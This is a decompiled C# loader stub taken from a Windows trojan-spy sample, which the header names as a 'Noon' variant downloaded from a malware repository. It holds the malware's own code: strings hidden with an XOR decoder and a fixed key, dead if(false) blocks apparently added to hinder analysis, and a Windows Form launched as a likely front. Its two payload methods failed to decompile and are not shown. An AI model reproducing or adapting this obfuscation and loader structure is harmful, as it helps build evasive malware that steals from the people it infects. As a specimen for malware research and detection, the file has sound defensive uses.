// Decompiled with JetBrains decompiler
// Type: ;8w1LFr.sgxPeiI
// Assembly: ;8w1LFr, Version=5.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 2CC07ADF-5A94-44BC-9C37-07435DAD286F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Noon.pef-7dfe305f31c1f571790f54c3522eb8c6066453e69a429782ebfc0d6f68b2ae34.exe

using \u003B8w1LFr;
using System;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Windows.Forms;

namespace \u003B8w1LFr
{
  internal static class sgxPeiI
  {
    private static void Main()
    {
      if (true)
        ;
      if (false)
      {
        SHA256 fromName = (SHA256) CryptoConfig.CreateFromName((string) null);
      }
      sgxPeiI.I\u0027y\u002BTK8(sgxPeiI.LiHKl\u0027x("<\b\u0014s\u0001#R&\u0017<", "WAP7kr4oRqHlPkgM3fwOJ"), sgxPeiI.LiHKl\u0027x("8\f\fK:*y", "WAP7kr4oRqHlPkgM3fwOJ"), sgxPeiI.LiHKl\u0027x(">\u001A\vz.8p>", "WAP7kr4oRqHlPkgM3fwOJ"), sgxPeiI.LiHKl\u0027x("3\u0006\u0019{", "WAP7kr4oRqHlPkgM3fwOJ"), sgxPeiI.LiHKl\u0027x(":\a\fm:\ns.\u0014-", "WAP7kr4oRqHlPkgM3fwOJ"), sgxPeiI.LiHKl\u0027x("6\a\u000Ep(?", "WAP7kr4oRqHlPkgM3fwOJ"), sgxPeiI.LiHKl\u0027x("\u001E\u0004\vvm>p+", "WAP7kr4oRqHlPkgM3fwOJ"), sgxPeiI.LiHKl\u0027x(">\u0004\vv\u00109})8,\u0006\"\u001D1", "WAP7kr4oRqHlPkgM3fwOJ"));
      if (true)
        ;
      if (false)
      {
        FileStream fileStream = new FileStream((string) null, FileMode.Open, FileAccess.Read, FileShare.Read);
      }
      Application.EnableVisualStyles();
      if (false)
      {
        Site site = new Site(Site.ParseSiteFromUrl((string) null));
      }
      if (false)
      {
        X509Certificate x509Certificate = new X509Certificate((string) null);
      }
      Application.SetCompatibleTextRenderingDefault(false);
      if (false)
      {
        SoapId soapId = new SoapId((string) null);
      }
      if (false)
      {
        object sign = (object) 0;
        if (((string) null)[0] == '-')
          sign = (object) -1;
        SoapYearMonth soapYearMonth = new SoapYearMonth(DateTime.ParseExact((string) null, SoapYearMonth.formats, (IFormatProvider) CultureInfo.InvariantCulture, DateTimeStyles.None), (int) sign);
      }
      Application.Run((Form) new FcXBJYu());
      if (true)
        return;
      int num = ((Assembly) null).GlobalAssemblyCache ? 1 : 0;
    }

    public static void I\u0027y\u002BTK8(
      string _param0,
      string _param1,
      string _param2,
      string _param3,
      string _param4,
      string Gzic5Cf,
      string _param6,
      string _param7)
    {
      // ISSUE: unable to decompile the method.
    }

    public static void IdJ\u003F_Jm(
      string _param0,
      string _param1,
      string _param2,
      string I2w2usK,
      string _param4,
      string _param5,
      string _param6,
      string h5bH812,
      DynamicMethod _param8,
      byte[] _param9)
    {
      // ISSUE: unable to decompile the method.
    }

    public static string LiHKl\u0027x(string _param0, string _param1)
    {
      if (true)
        ;
      string empty = string.Empty;
      if (false)
        SHA256.Create("System.Security.Cryptography.SHA256");
      for (int index = 0; index < _param0.Length; ++index)
      {
        int num = (int) _param0[index] ^ 13;
        empty += ((char) ((uint) (num ^ 37) ^ (uint) _param1[index % _param1.Length])).ToString();
      }
      return empty;
    }
  }
}
